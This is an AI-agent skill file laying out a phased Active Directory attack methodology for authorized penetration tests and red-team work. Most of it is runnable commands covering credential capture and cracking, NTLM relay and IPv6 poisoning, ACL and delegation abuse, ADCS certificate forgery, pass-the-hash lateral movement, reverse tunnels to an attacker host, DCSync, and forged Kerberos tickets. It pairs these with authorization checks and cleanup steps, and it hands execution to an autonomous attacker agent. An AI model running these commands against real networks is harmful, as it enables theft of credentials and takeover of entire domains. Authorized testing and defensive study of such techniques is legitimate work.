---
name: active-directory
description: "Full-phased Active Directory assessment methodology for authorized engagements — does NOT presume a foothold. Covers the DC-reaching network recon, AD/service enumeration (SMB/LDAP/Kerberos/ADCS), credential attacks (AS-REP roast, Kerberoast, spray, LLMNR/NBT-NS poisoning + NTLM relay, mitm6/IPv6 takeover), privesc via ACL abuse and delegation (unconstrained/constrained/RBCD) and ADCS ESC1-ESC8, lateral movement + pivoting, and domain dominance (DCSync, golden/silver/diamond tickets), with BloodHound collection/analysis. Use for any authorized internal AD penetration test or red-team engagement, from an outside-the-domain network position through to domain dominance."
---

# Active Directory Attack Methodology

A full-phased, authorized-engagement methodology for assessing an Active Directory forest. Unlike a foothold cheat-sheet, this starts from an **unauthenticated network position** and walks the whole kill chain: reach the DC → enumerate → obtain the first credential → escalate → move laterally → dominate the domain. Every attack below pairs a real operator command with a validation step so a finding is proven, not inferred.

Tools are referenced by their standard operator names (`nmap`, `impacket-*`, `netexec`/`nxc`, `kerbrute`, `certipy`, `Responder`, `ntlmrelayx.py`, `mitm6`, `bloodhound-python`, `evil-winrm`, `ligolo-ng`, `chisel`). `kerbrute` and `jwt_tool` are registered in the UBH arsenal (`tools/external_arsenal.sh` → `/arsenal <tool>` for an install hint); the rest are standard external offensive tooling you install into the operator environment — none of them is a UBH first-party `tools/` script, so do not invoke them via `tools/`.

## Phase 0 — Authorization Gate & When to Use

**This methodology is destructive-adjacent and identity-invasive. Do not run any phase past recon without written authorization.** Confirm before touching the domain:

- [ ] **Signed authorization** naming the target domain(s), IP ranges, and DC hostnames in scope.
- [ ] **Rules of engagement** state that credential attacks, Kerberos ticket forging, relay/coercion, and DCSync are explicitly permitted (many engagements forbid golden/silver tickets and DCSync as too destructive — see Phase 6).
- [ ] **A named client point of contact** reachable in real time to abort if a DC destabilizes or accounts lock out.
- [ ] **A test-account allowance** so lockout from Phase 3 spraying does not hit real staff.
- [ ] **Backup/rollback expectations** for any object you write (computer accounts, SPNs, `msDS-AllowedToActOnBehalfOfOtherIdentity`, ACLs) — you must revert every change (see Phase 7).

**When to use this skill:** an authorized internal penetration test or red-team where the target is a Windows domain and you have *network reachability to a Domain Controller*, whether or not you have credentials. If you already hold a foothold shell and only need the fast escalation cheat-sheet, the `ad-attacker` agent's phases are the terse executor form — this skill is the planning/methodology layer that agent runs against.

**When NOT to use it:** cloud-only Entra ID / M365 tenants with no on-prem DC (use `m365-entra-attack`); a pure external bug-bounty web target with no internal network access; anything outside a signed AD engagement.

## Phase 1 — Network Recon: Reaching the Domain Controller

Goal: from an IP on the internal network with no credentials, locate the DC(s), the domain name, and the reachable AD services.

```bash
# Find likely DCs by their service fingerprint (Kerberos 88, LDAP 389/636, GC 3268, DNS 53, SMB 445)
nmap -Pn -n -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 -sV --open 10.0.0.0/24 -oA ad_dc_sweep

# DNS SRV records are the authoritative way to enumerate DCs and the domain — query the DC's own DNS
nslookup -type=SRV _ldap._tcp.dc._msdcs.example.local <DC_IP>
nslookup -type=SRV _kerberos._tcp.example.local <DC_IP>
dig @<DC_IP> _ldap._tcp.dc._msdcs.example.local SRV +short

# Host discovery + null-session banner via netexec (nxc) — confirms domain name, DC role, SMB signing
nxc smb 10.0.0.0/24
nxc smb <DC_IP> -u '' -p ''        # null session: pulls domain, hostname, OS, signing:False?
```

**Validation:** you have Phase 1 when `nxc smb <DC_IP>` prints the domain FQDN, the DC's NetBIOS/DNS name, and the `signing` flag. `signing:False` is load-bearing — it decides whether Phase 3 relay is viable. Record the DC IP, domain FQDN, and forest root. If you already captured the domain/forest names anonymously over HTTP NTLM, that AV-pair intel comes from `hunt-ntlm-info` — reuse it here rather than re-deriving it.

## Phase 2 — AD & Service Enumeration

Enumerate SMB, LDAP, Kerberos, and ADCS. Anonymous/null first, then re-run everything the moment you hold any credential from Phase 3.

```bash
# Broad automated sweep (users, shares, groups, password policy, RID cycling) — anonymous or authed
enum4linux-ng -A <DC_IP>
nxc smb <DC_IP> -u '' -p '' --shares --users --pass-pol       # null-session enum
nxc smb <DC_IP> -u user -p 'Pass' --users --groups --shares    # authenticated re-run

# RID cycling to build a user list when null-session user enum is blocked
nxc smb <DC_IP> -u guest -p '' --rid-brute 5000

# LDAP: dump the directory once you can bind (anonymous binds are rare but worth trying)
ldapsearch -x -H ldap://<DC_IP> -b "DC=example,DC=local" -s base namingContexts   # anon probe
nxc ldap <DC_IP> -u user -p 'Pass' --trusted-for-delegation --asreproast /tmp/asrep.txt
windapsearch -d example.local --dc <DC_IP> -u user@example.local -p 'Pass' -U    # users w/ attrs

# Kerberos: is the DC reachable for AS-REQ? kerbrute validates usernames w/ no lockout risk
kerbrute userenum -d example.local --dc <DC_IP> users.txt

# ADCS: find the CA and any misconfigured templates (feeds Phase 4 ESC1-ESC8)
certipy find -u user@example.local -p 'Pass' -dc-ip <DC_IP> -stdout -vulnerable

# AD-integrated DNS zone dump (internal hostnames, often the whole asset map)
adidnsdump -u example.local\\user -p 'Pass' <DC_IP>
```

**Validation:** Phase 2 is real when you have a concrete user list (from RID-brute or LDAP), the domain **password policy** (lockout threshold + observation window — this gates Phase 3 spray math), and a `certipy find` output naming the CA. Note `enum4linux-ng`/`nxc` `--pass-pol` output verbatim; a `LockoutThreshold: 0` means spraying is safe, a low threshold means you must throttle.

### BloodHound Collection & Analysis

The moment you hold *any* domain credential, collect the graph — it turns the rest of this methodology from guesswork into shortest-path routing.

```bash
# Remote collection from Linux — no agent on the host
bloodhound-python -u user -p 'Pass' -d example.local -ns <DC_IP> -c All --zip
# On a Windows foothold: SharpHound.exe -c All --zippassword <pw>
```

Ingest the ZIP into BloodHound CE, then mark every credential you own as **Owned** and run the built-in "Shortest Path from Owned Principals to Domain Admins", "Find Principals with DCSync Rights", "Kerberoastable Users", and "Unconstrained/Constrained Delegation" queries. BloodHound is what tells you *which* Phase 4 ACL edge or delegation actually reaches DA — do not blindly attempt every abuse; follow the graph.

## Phase 3 — Credential Attacks (Getting the First Credential)

From zero credentials to a valid domain account. These are the highest-yield unauthenticated/low-priv vectors.

### AS-REP Roasting (no credentials needed if a user has pre-auth disabled)

```bash
# With a username list only — request AS-REPs for accounts with DONT_REQ_PREAUTH
impacket-GetNPUsers example.local/ -usersfile users.txt -no-pass -format hashcat -dc-ip <DC_IP>
hashcat -m 18200 asrep.txt rockyou.txt        # crack offline
```
**Validation:** a `$krb5asrep$` hash returned = confirmed. Impact is proven only after `hashcat` recovers the plaintext — a hash alone is a finding, a crack is a foothold.

### Kerberoasting (any authenticated user)

```bash
impacket-GetUserSPNs example.local/user:'Pass' -dc-ip <DC_IP> -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
```
**Validation:** a `$krb5tgs$` hash per SPN. As with AS-REP, escalate the finding severity only on a successful crack, and note the service account's group memberships (a cracked `MSSQLSvc` account in Domain Admins is a domain-dominance path).

**Unauthenticated Kerberoasting** is possible on unpatched DCs via the RC4-MD4 downgrade of **CVE-2022-33679** (session-key brute from an AS-REP for a pre-auth-disabled user) — if you have no creds at all, chain it after AS-REP roasting yields a session key. Reference: Horizon3 "From CVE-2022-33679 to Unauthenticated Kerberoasting".

### Password Spray (1 password × all users per round — never brute one user)

```bash
# Confirm lockout policy FIRST (Phase 2). Spray one candidate across all users, then wait a full window.
nxc smb <DC_IP> -u users.txt -p 'Winter2026!' --continue-on-success
kerbrute passwordspray -d example.local --dc <DC_IP> users.txt 'Winter2026!'
```
**Validation:** `[+]` / `Pwned!` on a `user:pass` pair = confirmed. The spray *methodology* — wordlist generation, HIBP ranking, lockout math, and the hard operational guards — lives in `credential-attack`; this phase only covers the AD-specific spray primitives (`nxc`, `kerbrute`). Do not duplicate that pipeline here; drive it from there.

### LLMNR / NBT-NS / mDNS Poisoning + NTLM Relay

When the DC advertised `signing:False` in Phase 1, poisoned name-resolution auth can be relayed to authenticate against another host.

```bash
# 1) Poison broadcast name resolution to capture NetNTLMv2 (Responder answers stale lookups)
#    Turn OFF Responder's own SMB/HTTP servers so you can relay instead of just capture.
responder -I eth0 -dwv                          # capture-only: NetNTLMv2 → hashcat -m 5600
# 2) Relay captured auth to an SMB target that does NOT enforce signing
ntlmrelayx.py -tf targets_no_signing.txt -smb2support -socks
# 3) Relay to LDAP(S) to grant RBCD or dump the directory
ntlmrelayx.py -t ldaps://<DC_IP> --delegate-access --no-dump -smb2support
```
**Validation:** for capture-only, a cracked NetNTLMv2 hash. For relay, a proven action — an authenticated SOCKS session (`ntlmrelayx` prints `SOCKS`), a written RBCD attribute, or a dumped hive. A relay that only shows the connection is not proof. **CVE-2019-1040** (NTLM MIC removal, "drop-the-MIC") and **CVE-2025-33073** (reflective NTLM/Kerberos relay to SYSTEM on hosts not enforcing SMB signing, patched June 2025) are the disclosed relay-mitigation bypasses to check for on unpatched fleets.

### mitm6 — IPv6 DNS Takeover

Windows prefers IPv6 and asks for a DHCPv6 lease + DNS server on boot; mitm6 answers, becomes the client's DNS, and relays WPAD/LDAP auth.

```bash
mitm6 -d example.local                                   # become primary IPv6 DNS for the segment
ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh wpad.example.local --delegate-access -smb2support
```
**Validation:** `ntlmrelayx` reports a relayed machine account and a created/modified delegation right (e.g., a new computer object or an RBCD write). Because this abuses default IPv6 behavior, get explicit RoE sign-off — it is noisy and network-wide.

## Phase 4 — Privilege Escalation: ACL Abuse, Delegation & ADCS

Follow the BloodHound graph. Every abuse below writes to the directory, so log the pre-change state (Phase 7).

### ACL Abuse

| Right (BloodHound edge) | What it grants | Operator command |
|---|---|---|
| `ForceChangePassword` | Reset a user's password w/o the old one | `net rpc password "victim" 'New!' -U 'example.local/attacker%Pass' -S <DC_IP>` |
| `AddMember` / `GenericWrite` on a group | Add yourself to a privileged group | `bloodyAD -u attacker -p Pass -d example.local --host <DC_IP> add groupMember "Domain Admins" attacker` |
| `GenericAll` on a user | Full control → set a fake SPN → targeted Kerberoast | `targetedKerberoast.py -u attacker -p Pass -d example.local` |
| `WriteDACL` / `WriteOwner` | Grant yourself DCSync or take ownership | `dacledit.py -action write -rights DCSync -principal attacker -target-dn 'DC=example,DC=local' example.local/attacker:Pass` |

**Validation:** re-authenticate as the reset/added principal and confirm the new access (e.g., `nxc smb <DC_IP> -u victim -p 'New!'` succeeds, or `net group "Domain Admins" /domain` lists you). Prefer abusing rights *remotely* (impacket/bloodyAD) over interactive logon to keep the change reversible.

### Delegation Abuse

| Delegation type | Precondition | Abuse |
|---|---|---|
| **Unconstrained** | Control a host trusted for unconstrained delegation | Coerce a DC to auth to it (PrinterBug/PetitPotam), capture the DC's TGT, then DCSync |
| **Constrained (S4U2Proxy)** | Control an account with `msDS-AllowedToDelegateTo` set | `getST.py -spn cifs/target.example.local -impersonate administrator example.local/svc:Pass` |
| **Resource-Based (RBCD)** | `GenericWrite`/`WriteDACL` on a target computer object | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` to a computer you control, then S4U impersonate |

```bash
# Coerce a DC to authenticate (PetitPotam CVE-2021-36942 / PrinterBug) — feeds unconstrained + relay
Coercer coerce -u user -p 'Pass' -d example.local -t <DC_IP> -l <ATTACKER_IP>

# RBCD end-to-end (needs MachineAccountQuota > 0 or an existing computer you control)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' example.local/user:'Pass' -dc-ip <DC_IP>
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write example.local/user:'Pass'
getST.py -spn cifs/target.example.local -impersonate administrator example.local/EVIL$:'P@ss'
```
**Validation:** a usable service ticket for the impersonated admin against the target SPN — prove it by `export KRB5CCNAME=administrator.ccache && nxc smb target.example.local -k` returning admin access. **Delete `EVIL$` and clear the RBCD attribute afterward.**

### ADCS ESC1–ESC8

```bash
certipy find -u user@example.local -p 'Pass' -dc-ip <DC_IP> -stdout -vulnerable
# ESC1: template allows requester-supplied SAN + client-auth EKU → request as a DA
certipy req -u user@example.local -p 'Pass' -ca 'EXAMPLE-CA' -template 'VulnTemplate' \
  -upn administrator@example.local -dc-ip <DC_IP>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>          # PKINIT → TGT + NT hash
```
- **ESC1** (SAN + client-auth) and **ESC4** (dangerous template ACL) are the highest-yield.
- **ESC6** is the `EDITF_ATTRIBUTESUBJECTALTNAME2` CA flag; **ESC8** is HTTP enrollment relay — coerce a machine (Coercer) and relay to `/certsrv/certfnsh.asp` with `ntlmrelayx.py --adcs`.
- **CVE-2022-26923 (Certifried)** is the machine-account `dNSHostName` manipulation → cert-based DA escalation; check it explicitly on unpatched CAs.

**Validation:** `certipy auth` returns a valid TGT and the account's NT hash — prove impact by using that hash for a Phase 5 login or a Phase 6 DCSync. A minted PFX alone is a finding; authenticated access is the proof.

## Phase 5 — Lateral Movement & Pivoting

Move with the credential/hash/ticket obtained above. Use the least-noisy exec method that works.

```bash
# WinRM (cleanest when 5985/5986 is open) — password or pass-the-hash
evil-winrm -i <TARGET> -u administrator -H <NTHASH>
nxc winrm <TARGET> -u administrator -H <NTHASH> -x 'whoami /all'

# SMB-based exec (impacket) — psexec (noisiest, drops a service), smbexec, wmiexec (quietest)
impacket-wmiexec example.local/administrator@<TARGET> -hashes :<NTHASH>
impacket-smbexec example.local/administrator@<TARGET> -hashes :<NTHASH>

# Over-pass-the-hash / pass-the-ticket
getTGT.py example.local/administrator -hashes :<NTHASH> && export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass example.local/administrator@<TARGET>
```

**Pivoting** — tunnel deeper subnets back through your foothold:

```bash
# ligolo-ng: agent on the compromised host connects back to your proxy; gives a routed tun interface
./proxy -selfcert                     # attacker; then in the session: session; start
./agent -connect <ATTACKER_IP>:11601  # on the foothold host
# chisel SOCKS alternative
./chisel server -p 8080 --reverse     # attacker
./chisel client <ATTACKER_IP>:8080 R:socks   # foothold
```
**Validation:** for exec, the literal `whoami`/`hostname` output from the target (distinct from your foothold). For pivoting, a routed reach you did not have before — e.g., `nxc smb <deeper-subnet>` returning banners only reachable through the tunnel.

## Phase 6 — Domain Dominance (Heavy Authorization Required)

**These actions forge trust material or dump the entire domain's secrets. They are commonly excluded from RoE.** Do not run any of them without an explicit line in the authorization permitting DCSync and/or ticket forging, and coordinate timing with the client — a golden ticket abuses the KRBTGT key and DCSync generates high-fidelity replication alerts.

```bash
# DCSync — requires DA or replication rights (Phase 4 WriteDACL can grant these)
impacket-secretsdump example.local/administrator@<DC_IP> -just-dc-user krbtgt   # scope to one user
impacket-secretsdump -hashes :<NTHASH> example.local/administrator@<DC_IP> -just-dc

# Golden ticket (KRBTGT hash + domain SID) — forges any user, incl. non-existent
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain example.local Administrator
# Silver ticket (service account hash) — forges a TGS for one SPN, no DC contact
impacket-ticketer -nthash <SVC_HASH> -domain-sid <SID> -domain example.local -spn cifs/host.example.local Administrator
# Diamond ticket — modifies a REAL TGT's PAC (blends with legitimate tickets, evades golden-ticket detection)
Rubeus.exe diamond /krbkey:<AES256> /ticketuser:administrator /domain:example.local /dc:<DC>
```
**Validation:** the extracted KRBTGT hash and a forged ticket that authenticates — `export KRB5CCNAME=admin.ccache && nxc smb <DC_IP> -k` returning admin. **Scope `secretsdump` to a single user (`-just-dc-user`) unless a full dump is explicitly authorized; treat every recovered hash as sensitive under `evidence-hygiene`.**

## Phase 7 — Validation & False-Positives (Gate 0)

House rule for every AD finding: **prove a state change or a data read; never infer impact from a banner or a status code.** Before it goes in the report:

1. **What can the attacker do RIGHT NOW?** A `$krb5tgs$`/`$krb5asrep$` hash is *potential* — only a crack, an authenticated action, or a minted+used ticket is *impact*. `signing:False` is a precondition, not a finding on its own.
2. **Rule out benign explanations.** `nxc` `200`/anonymous LDAP read is often intentional low-privilege access. A relayed connection that shows no post-relay action is not a compromise. A `certipy find` template flagged `[!]` is only ESC-vulnerable if the enrollment/EKU/ACL conditions are actually met — confirm with a live `certipy req`.
3. **Reproduce in a clean session.** Re-run the exact command from a fresh shell and capture the proving artifact (cracked plaintext, `whoami` output, decoded secret bytes — redacted per `evidence-hygiene`).
4. **Confirm you reverted every write.** Deleted `EVIL$`? Cleared `msDS-AllowedToActOnBehalfOfOtherIdentity`? Removed yourself from privileged groups? Reset passwords you changed? An engagement that leaves writable artifacts behind is a finding *against you*.
5. **Lockout / stability check.** If Phase 3 spraying or Phase 4 password resets may have locked accounts or destabilized a DC, notify the client contact immediately with timestamps.

## How This Plugs Into the Agentic Workflow

This skill is the **AD planning/methodology layer**. In the plugin's `/hunt` pipeline, `hunt-dispatch` fingerprints the environment and — when internal Windows/AD signals appear (Kerberos 88, LDAP 389, SMB signing, `login`/DC banners) — loads this skill and hands execution to the `ad-attacker` **agent**, which is the terse per-phase executor. The division of labour: this SKILL defines the phased strategy, the authorization gate, the validation discipline, and the cross-skill chains; the `ad-attacker` agent runs the concrete commands and reports back in its structured output block. BloodHound output from Phase 2 becomes the routing graph the agent follows so it attacks along a proven shortest path rather than exhaustively. Findings then flow through `triage-validation` and `report-writing` like any other class.

## Related Skills

- **`ad-attacker` (AGENT)** — the executor that runs this methodology's commands from a foothold. Reference its structured Phase-0→7 output and Quick-Kill signals; this skill is the strategy/authorization/validation layer it operates within. Do not duplicate its command blocks here.
- **`hunt-ntlm-info`** — anonymous NTLM Type-2 AV-pair capture on internet-reachable IIS/Exchange/SharePoint leaks the internal domain FQDN, forest tree name, and DC hostname. Chain primitive: `hunt-ntlm-info` AV-pair decode → feed the domain/forest name straight into Phase 1 (skip DNS-SRV derivation) and the UPN format into Phase 3 spraying.
- **`m365-entra-attack`** — the hybrid pivot. Chain primitive: DCSync'd creds or a discovered UPN suffix from this skill → cross-reference the Entra tenant (`login.microsoftonline.com/<domain>/.well-known/openid-configuration`) → run the Entra ROPC spray / AADSTS enumeration there. Use it, not this skill, for cloud-only tenants.
- **`credential-attack`** — the full password-spray pipeline (wordlist-gen → HIBP ranking → osint-employees → spray), lockout math, and hard operational guards. Phase 3 here only lists the AD-specific spray primitives (`nxc`, `kerbrute`); drive the actual campaign from `credential-attack` rather than re-teaching it.
- **`hunt-k8s`** — Windows/AD-joined container nodes bridge the two surfaces. Chain primitive: a domain credential or SA token from this skill that lands on an AD-joined K8s node → `hunt-k8s` for the cluster breakout; or a `hunt-k8s` node-shell whose kubelet SA reaches an AD-joined host → return here for the domain escalation.
